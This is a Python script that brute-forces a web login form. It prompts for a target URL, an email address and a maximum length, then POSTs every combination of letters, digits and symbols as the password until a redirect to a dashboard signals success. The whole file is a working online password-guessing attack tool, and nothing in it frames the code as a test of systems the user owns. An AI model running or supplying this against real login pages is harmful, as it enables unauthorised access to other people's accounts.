from itertools import product
import datetime
import requests

x = datetime.datetime.now()

#this is the list for available characters
L1 = ['A','B','C','D','E','F','G','H','I','J','K','L','M',
      'N','O','P','Q','R','S','T','U','V','W','X','Y','Z']
L2 = [1, 2, 3, 4, 5, 6, 7, 8, 9, 0]
L3 = ['a','b','c','d','e','f','g','h','i','j','k','l','m',
      'n','o','p','q','r','s','t','u','v','w','x','y','z']
L4 = ['!','@','#','$','%','^','&','*','(',')','-','_','=','+',
      '[',']','{','}','|',';',':','<','>','?','/','~']

#this is for combining the characters
L5 = L1 + L2 + L3 + L4

#this is for taking the input from the user
TARGET_URL = input("Enter the target URL: ")
email      = input("Enter the email address: ")
max_length = int(input("Enter the maximum password length: "))

found = False

for length in range(1, max_length + 1): #this is for trying the combinations in different lengths
    print(f"Trying passwords of length {length}...")
    for combo in product(L5, repeat=length): #this is for generating the combinations of characters
        attempt = ''.join(str(c) for c in combo)
        response = requests.post(TARGET_URL, data={
            'email': email,            #this is for sending the data to the target URL
            'password': attempt
        }, allow_redirects=False)

        #this is for checking if the login is succesful
        if response.status_code == 302 and 'dashboard' in response.headers.get('Location', ''):
            print(f"\n✅ Password found: {attempt}")
            print(f"⏱ Time taken: {datetime.datetime.now() - x}")
            found = True
            break

        else:
            print(f"❌ Tried: {attempt}")

    if found:
        break

if not found:
    print("Password not found.")